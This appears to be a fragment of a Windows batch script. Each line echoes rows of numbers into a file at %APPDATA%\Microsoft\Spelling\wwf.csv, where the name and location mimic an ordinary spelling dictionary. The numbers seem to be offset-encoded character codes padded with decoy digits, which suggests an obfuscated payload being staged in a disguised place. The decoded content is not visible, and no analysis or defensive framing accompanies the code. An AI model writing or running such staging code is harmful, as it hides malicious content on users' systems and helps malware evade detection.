>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.9792;698.101;814.83;816.114;6429.30;68.801;102.497;117.1450;808.116;565.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.97;6573.815;0.383;121.815;116.6001;801.109;778.117;809.101;5569.814;105.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.70;83.4277;821.115;816.101;809.46;3716.468;105.797;103.810;111.7335;815.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.99;815.0;3458.589;101.815;0.472;97.9654;810.100;808.101;380.97;1653.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.487;105.816;104.3399;483.112;697.99;801.115;4485.30;83.821;115.816;101.5747;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.87;801.98;683.101;1597.814;118.805;99.801;115.9641;60.83;821.115;816.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7260.809;69.810;116.801;114.4315;812.114;805.115;801.83;6047.801;114.818;105.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.6541;815.0;783.121;815.116;8807.801;109.346;82.817;110.1564;816.105;809.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(746.73;8175.810;116.801;114.811;112.1633;783.101;814.118;805.99;9181.801;115.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.821;115.5945;816.101;809.46;482.117;7794.810;116.805;109.801;46.8357;767.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.112;805.108;4549.801;114.483;101.814;118.9105;805.99;801.115;30.83;9951.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.816;101.809;68.8128;805.114;801.99;816.111;9667.814;121.583;101.814;118.5813;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.99;801.115;30.83;5586.821;115.816;101.809;46.7037;382.101;815.111;817.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1281.399;101.815;0.477;105.6295;599.114;811.115;811.102;0551.816;46.787;111.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(107.2529;802.108;811.119;746.67;5793.811;109.812;105.808;101.6788;814.46;483.82;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(546.114;4472.801;115.811;117.814;99.8421;801.115;50.68;801.98;6325.817;103.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.810;103.0779;377.111;800.101;815.0;1291.683;117.812;112.811;114.6227;816.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.76;797.110;2089.803;117.597;103.801;115.5691;40.118;397.108;805.100;2634.597;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.805;111.810;83.4511;819.105;816.99;804.101;8239.815;0.780;97.814;115.0402;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.65;814.103;817.109;5716.801;110.816;115.673;110.5622;816.111;783.119;805.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6338.399;104.801;115.70;115.5380;819.105;816.99;804.101;9818.815;0.803;101.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.8121;682.101;802.101;814.101;1838.810;99.801;100.465;115.4760;815.101;809.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.105;8602.801;115.50;65.800;100.2283;385.115;801.114;382.101;3721.802;101.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.810;99.3589;801.100;765.115;815.101;1931.809;98.808;105.801;115.8693;40.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.116;695.86;0171.497;108.817;101.815;0.6747;597.108;808.111;819.101;3869.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.697;108.817;101.2245;815.0;580.114;811.99;3389.801;115.815;83.819;105.8363;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.99;804.86;797.108;5914.817;101.815;0.815;119.8838;805.116;799.104;386.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1346.808;117.801;115.50;121.5587;801.115;40.103;801.116;8453.595;72.397;115.787;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.8950;814.110;805.110;803.115;3465.60;97.814;103.815;0.7298;803.101;816.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(476.105;2110.598;114.497;114.821;80.2717;797.116;804.115;30.71;5765.801;116.376;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.815;116.9046;679.102;676.105;798.114;2401.597;114.821;80.397;116.4556;804.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.69;813.117;7992.597;108.815;0.683;121.8096;815.116;801.109;587.105;4143.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.811;119.815;70.2778;811.114;809.115;50.77;4101.805;99.814;111.815;111.3134;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.116;486.105;815.117;9684.597;108.583;116.817;100.4864;805.111;487.105;810.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6452.811;119.815;70.811;114.1695;809.115;50.67;811.110;2572.816;97.805;110.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3153;383.121;815.116;801.109;4705.787;101.398;69.820;116.7114;801.110;815.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.110;9637.815;0.783;121.815;116.8829;801.109;487.101;798.82;8377.801;103.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.497;114.1613;669.120;812.114;801.115;4166.815;105.811;110.815;0.4386;583.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.116;801.109;8463.767;111.809;112.811;110.6873;801.110;816.77;811.100;6962.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.468;97.816;97.6828;665.110;810.111;816.97;8333.816;105.811;110.815;0.9196;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(483.121;815.116;801.109;5515.587;101.598;65.398;115.7379;816.114;597.99;816.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9875.811;110.815;0.683;121.2900;815.116;801.109;746.67;8711.811;108.808;101.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.2945;805.111;810.115;60.103;3699.801;116.695;67.811;109.3654;812.105;808.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.79;4279.812;116.805;111.810;115.1169;70.115;801.116;595.67;1568.811;109.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.808;101.8767;814.79;812.116;805.111;9186.810;115.60;103.801;116.0076;795.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.97;814.115;1040.40;112.814;111.818;105.5657;800.101;814.115;70.67;5201.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.812;105.808;101.0376;814.72;801.108;812.101;9096.814;115.70;87.811;114.9731;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.102;808.111;819.67;4381.811;109.812;105.808;101.2688;814.80;597.114;797.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6532.801;116.801;114.815;0.2352;699.111;809.112;805.108;0847.801;114.480;97.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.6118;809.101;816.101;814.115;1909.60;112.697;114.397;109.3536;801.116;801.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;7210.803;101.816;95.569;114.3618;814.111;814.115;40.71;1591.801;110.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.797;116.0806;801.100;669.114;814.111;0930.814;115.50;103.801;116.9111;695.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(397.115;569.114;3429.814;111.814;115.40;83.9253;821.115;816.101;809.83;4063.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.818;105.499;101.3827;480.114;811.99;801.115;4496.815;0.787;111.814;107.7258;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.108;811.119;367.111;9299.809;112.805;108.801;114.0902;582.101;815.117;808.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7311.815;0.803;101.816;95.8421;769.120;805.115;816.115;9325.60;67.811;110.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.6755;816.0;470.111;814.109;2065.497;116.60;79.398;106.5341;801.99;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(687.70;2171.367;95.767;111.812;121.2395;814.105;803.104;816.0;9902.683;112.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.816;0.9559;469.120;805.116;30.84;6063.811;76.811;119.801;114.5484;773.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(818.97;814.105;8778.797;110.816;0.383;121.5081;815.116;801.109;568.97;6533.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.479;114.697;99.1121;808.101;367.108;805.101;5979.810;116.50;83.821;115.4239;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.101;809.77;597.110;3589.397;103.801;109.801;110.9774;816.0;780.97;814.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8538.801;65.814;103.817;109.2036;801.110;816.0;397.114;7238.803;117.809;101.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.2996;50.83;821.115;816.101;0149.809;68.801;112.808;111.2690;821.109;801.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;6958.803;101.816;95.567;117.4876;814.114;801.110;816.0;2616.803;101.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.567;111.2850;817.110;816.0;577.105;9561.399;114.811;115.811;102.0766;816.74;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(683.99;814.105;7324.812;116.70;87.770;67.3301;795.72;801.108;812.95;7814.679;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.816;105.811;110.1660;815.95;683.116;697.114;4465.816;0.682;111.811;116.7968;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(578.97;809.101;815.112;7502.397;99.801;83.804;111.8056;814.116;40.82;801.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2092.801;114.801;110.699;101.8493;383.104;811.114;816.0;4613.482;101.815;111.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.3761;399.101;683.104;811.114;4972.816;0.578;111.767;111.3483;800.101;383.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;3753.816;0.576;97.810;103.4072;817.97;803.101;383.104;9348.811;114.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.468;101.8211;698.117;803.83;804.111;2034.814;116.40;84.797;114.0266;803.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.70;814.97;1150.809;101.819;111.814;107.7896;683.104;811.114;816.0;6353.678;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.687;97.814;110.0404;783.104;811.114;816.0;9795.478;111.376;111.803;111.8115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.104;811.114;816.0;9286.472;101.808;112.583;104.6388;811.114;816.0;386.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1882.808;105.800;97.816;101.0774;382.111;811.116;365.99;7721.816;105.818;116.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.8633;815.83;804.111;814.116;2887.40;67.804;101.499;107.2801;784.121;812.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.83;4978.804;111.814;116.40;84.6681;697.114;803.101;816.83;0398.804;111.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.30;79.4705;817.116;383.104;811.114;9450.816;0.376;105.498;114.8932;397.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.83;804.111;5472.814;116.30;83.821;115.2955;816.101;809.78;801.116;1418.572;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.816;112.587;101.5349;698.82;801.113;817.101;4887.815;116.70;87.670;67.1049;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(495.72;801.108;812.95;9867.573;110.812;117.816;0.8613;387.70;467.95;672.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8350.808;112.395;79.817;116.2972;812.117;816.0;377.111;2523.818;101.578;101.820;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.2107;60.83;821.115;816.101;4150.809;46.684;101.820;116.5081;50.83;821.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.101;2362.809;84.804;114.801;97.1073;800.105;810.103;584.97;4864.815;107.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(68.497;116.1491;797.102;808.111;819.0;4535.484;97.814;103.801;116.7997;570.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(497.109;801.119;3626.811;114.807;52.448;80.3995;814.101;802.105;820.0;6017.569;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.809;97.480;117.8054;798.108;805.99;675.101;3820.821;0.783;104.697;114.7068;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.100;476.105;798.80;8553.817;98.808;105.799;75.3262;801.121;50.83;805.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0646.818;101.814;108.805;103.9826;804.116;380.108;497.116;3462.802;111.814;109.680;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.4622;498.108;805.99;375.101;1327.821;0.365;83.680;66.9184;814.111;819.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.114;8580.367;97.812;115.580;117.9038;598.108;805.99;575.101;8590.821;0.477;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.599;114.0796;811.115;811.102;816.80;5948.817;98.808;105.699;75.0636;801.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.83;805.108;3380.818;101.814;108.805;103.1525;804.116;580.117;598.108;8114.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.375;101.821;0.9759;567.111;810.116;597.105;2936.810;115.475;101.821;0.5853;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(570.88;765.115;815.101;2661.809;98.808;121.40;103.1977;801.116;495.65;815.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9303.801;109.498;108.821;0.0135;571.101;816.69;820.101;0180.699;117.816;105.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.1040;465.115;815.101;809.98;9771.808;121.50;84.804;105.2954;815.65;815.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.109;8527.698;108.821;0.803;101.5819;816.95;773.115;784.97;4489.814;103.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.365;115.8419;815.101;809.98;808.121;6837.50;116.697;114.803;101.9088;816.65;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.115;801.109;1686.598;108.821;0.815;101.2662;816.95;779.117;816.112;3546.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.465;115.815;101.6485;809.98;808.121;70.73;7755.810;100.801;120.779;102.3863;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(365.110;821.0;365.83;8347.780;66.814;111.819;115.6354;801.114;667.97;812.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5695.470;97.799;116.811;114.2054;821.0;668.105;814.101;5162.799;116.811;114.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4787;811.112;595.69;813.117;0459.697;108.805;116.821;0.6699;783.121;815.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.109;5514.483;101.799;117.814;105.8329;816.121;30.73;815.78;9629.817;108.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(79.814;69.3436;809.112;816.121;70.0;5284.50;61.577;0.805;0.0937;399.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;811.0;4280.815;0.811;0.802;0.3122;816.0;346.0;587.0;4126.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.807;0.1002;802.0;808.0;811.0;5450.819;0.546;0.767;0.0656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;809.0;812.0;9435.805;0.808;0.801;0.6130;814.0;546.0;383.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2735.782;0.40;3.432;0.5451;70.59;677.0;805.0;6106.815;0.815;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6783;810.0;803.0;570.0;6608.805;0.808;0.801;0.9050;783.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;2152.799;0.805;0.802;0.4159;805.0;599.0;397.0;4612.816;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.2405;810.0;669.0;814.0;6621.814;0.811;0.814;0.5413;70.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(446.0;820.0;3743.811;0.809;0.808;0.9578;30.7;746.0;799.0;7915.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;7.646;0.5100;818.0;398.0;40.53;4228.485;0.810;0.814;0.4417;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;599.0;811.0;8592.803;0.810;0.805;0.6422;822.0;801.0;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1963.683;0.811;0.817;0.8446;814.0;399.0;801.0;2326.570;0.805;0.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6464;801.0;784.0;821.0;0918.812;0.801;0.60;39.1765;583.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;9153.814;0.699;0.801;0.7541;670.0;805.0;808.0;8555.801;0.673;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.815;0.3265;673.0;810.0;818.0;8170.497;0.808;0.805;0.5683;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.15;479.0;4670.817;0.816;0.676;0.9489;811.0;810.0;803.0;4102.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.379;0.817;0.7329;816.0;583.0;804.0;8327.811;0.814;0.816;0.0765;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.35;582.0;811.0;9701.811;0.816;0.378;0.2606;497.0;809.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7706.815;0.812;0.497;0.4094;699.0;801.0;576.0;4379.811;0.810;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0892;60.37;682.0;811.0;0406.811;0.816;0.378;0.3498;597.0;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;1219.815;0.812;0.597;0.8443;399.0;801.0;583.0;0254.804;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.6760;816.0;70.37;383.0;0879.808;0.497;0.815;0.2141;804.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(382.0;811.0;5039.811;0.816;0.478;0.1150;497.0;809.0;801.0;8016.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;0.697;0.1373;799.0;801.0;50.51;7611.387;0.570;0.467;0.4621;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(495.0;382.0;811.0;1047.811;0.816;0.478;0.7082;397.0;809.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1078.815;0.812;0.597;0.1585;499.0;801.0;695.0;1948.387;0.397;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3646;810.0;805.0;810.0;0518.803;0.70;17.765;0.2212;815.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;5818.809;0.598;0.808;0.4285;821.0;50.7;469.0;4674.820;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;21.9829;584.0;497.0;814.0;1287.803;0.801;0.816;0.4136;576.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;810.0;2599.803;0.70;23.584;0.6364;797.0;814.0;803.0;3223.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.483;0.2023;804.0;811.0;814.0;8129.816;0.30;49.573;0.7641;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;818.0;797.0;0015.808;0.805;0.800;0.7992;584.0;797.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1805.803;0.801;0.816;0.6413;783.0;819.0;805.0;1603.816;0.399;0.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6237;486.0;597.0;808.0;9023.817;0.801;0.30;23.1569;476.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(698.0;6574.814;0.397;0.814;0.8960;821.0;576.0;811.0;3400.810;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;25.3926;776.0;805.0;598.0;5373.814;0.397;0.814;0.1501;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.0;804.0;5879.811;0.814;0.816;0.5672;60.41;476.0;805.0;2331.598;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.497;0.7464;814.0;821.0;380.0;5314.697;0.816;0.804;0.6472;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(473.0;815.0;573.0;2000.810;0.818;0.497;0.9032;808.0;805.0;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1303.70;27.682;0.801;0.6481;802.0;801.0;814.0;0591.801;0.810;0.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5658;801.0;476.0;811.0;6530.810;0.803;0.60;29.8278;682.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.0;3955.801;0.814;0.801;0.1500;810.0;499.0;801.0;6110.783;0.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.2013;814.0;816.0;40.25;2385.382;0.801;0.815;0.8988;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;814.0;6220.799;0.801;0.576;0.9532;811.0;810.0;803.0;7199.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(27.382;0.801;0.3215;815.0;811.0;817.0;8968.814;0.799;0.801;0.8860;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.0;804.0;811.0;0381.814;0.816;0.50;23.3551;432.0;647.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6139.801;0.815;0.811;0.0770;817.0;814.0;699.0;7087.801;0.558;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7.9496;689.0;801.0;815.0;4270.60;5.578;0.811;0.9555;30.19;668.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;8377.498;0.817;0.803;0.0522;476.0;811.0;810.0;4746.803;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(47.473;0.0806;810.0;818.0;597.0;9708.808;0.805;0.800;0.9524;668.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;798.0;7256.817;0.803;0.383;0.2930;819.0;805.0;816.0;4115.599;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.804;0.486;0.9541;597.0;808.0;817.0;3385.801;0.40;5.567;0.0894;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.0;70.5;486.0;7115.666;0.50;25.376;0.3045;697.0;810.0;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5625.817;0.497;0.803;0.0296;801.0;676.0;811.0;4453.810;0.803;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(27.0842;376.0;397.0;810.0;5463.803;0.817;0.397;0.3282;803.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(683.0;0956.804;0.811;0.814;0.0692;816.0;70.53;473.0;4586.810;0.818;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.697;0.5898;808.0;805.0;800.0;9327.776;0.597;0.810;0.0107;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;697.0;6739.803;0.801;0.483;0.8854;819.0;805.0;816.0;3643.499;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.804;0.786;0.6028;397.0;808.0;817.0;3872.801;0.30;13.767;0.4215;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.0;804.0;397.0;4491.814;0.812;0.70;15.7237;675.0;801.0;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1810.470;0.805;0.808;0.5185;801.0;50.3;434.0;0886.50;5.732;0.447;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4964;40.3;358.0;50.25;5349.775;0.801;0.821;0.6604;467.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;9288.816;0.597;0.805;0.7204;810.0;801.0;814.0;1037.60;19.468;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.3168;808.0;797.0;821.0;4408.783;0.805;0.803;0.0014;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.55;673.0;9661.810;0.818;0.597;0.5818;808.0;805.0;800.0;7071.768;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.808;0.4578;697.0;821.0;583.0;7357.805;0.803;0.810;0.4083;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.0;819.0;805.0;3714.816;0.799;0.804;0.0454;486.0;797.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0057.817;0.801;0.30;3.0371;443.0;70.3;545.0;1953.61;17.372;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4677;808.0;812.0;776.0;0441.811;0.810;0.803;0.6101;50.19;772.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;3178.808;0.812;0.683;0.0116;804.0;811.0;814.0;9742.816;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.387;0.9361;370.0;467.0;495.0;7041.484;0.805;0.816;0.0634;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;30.21;4902.452;0.746;0.356;0.2841;346.0;551.0;757.0;9208.750;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.656;0.646;0.0816;348.0;50.27;587.0;1002.770;0.467;0.595;0.5434;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(367.0;811.0;812.0;3248.821;0.814;0.805;0.2824;803.0;804.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6016.70;45.787;0.370;0.0778;667.0;495.0;772.0;5424.801;0.808;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6597;795.0;479.0;812.0;5838.816;0.805;0.811;0.8093;810.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(495.0;3146.683;0.816;0.697;0.9349;814.0;816.0;60.31;3031.387;0.470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.467;0.4455;395.0;672.0;801.0;5791.808;0.812;0.695;0.2374;585.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;697.0;0596.803;0.801;0.651;0.3575;60.31;787.0;770.0;5168.567;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.495;0.472;0.6161;801.0;808.0;812.0;2256.695;0.785;0.815;0.8948;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(697.0;803.0;801.0;1219.552;0.40;31.687;0.1162;370.0;667.0;595.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2425.772;0.801;0.808;0.5997;812.0;595.0;585.0;0801.815;0.797;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4394;801.0;653.0;50.31;1674.387;0.670;0.367;0.0182;595.0;372.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;2451.808;0.812;0.395;0.2336;579.0;817.0;816.0;0079.812;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.4209;30.33;587.0;370.0;0467.667;0.695;0.472;0.6467;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;812.0;8813.595;0.579;0.817;0.1849;816.0;812.0;817.0;8965.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.449;0.30;33.5421;787.0;670.0;367.0;5355.695;0.472;0.801;0.7743;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;812.0;795.0;3229.479;0.817;0.816;0.3831;812.0;817.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5902.550;0.70;37.387;0.5199;370.0;667.0;795.0;7973.572;0.801;0.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1317;812.0;395.0;679.0;2175.817;0.816;0.812;0.7211;817.0;816.0;
